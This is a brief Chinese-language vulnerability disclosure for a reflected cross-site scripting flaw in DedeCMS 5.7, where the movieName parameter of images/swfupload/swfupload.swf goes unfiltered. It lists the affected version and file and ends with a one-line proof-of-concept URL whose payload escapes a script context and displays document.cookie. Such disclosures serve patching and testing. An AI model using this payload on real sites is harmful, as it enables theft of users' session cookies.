# Dedecms swf文件反射型xss

## 漏洞简介

DedeCMS 5.7 /images/swfupload/swfupload.swf文件movieName参数没有合适过滤，导致跨站脚本漏洞。

### 漏洞影响版本

DedeCMS 5.7

## 文件位置

漏洞文件为：http://127.0.0.1/images/swfupload/swfupload.swf

### 漏洞POC

```
http://127.0.0.1/images/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert(document.cookie)}}//
```

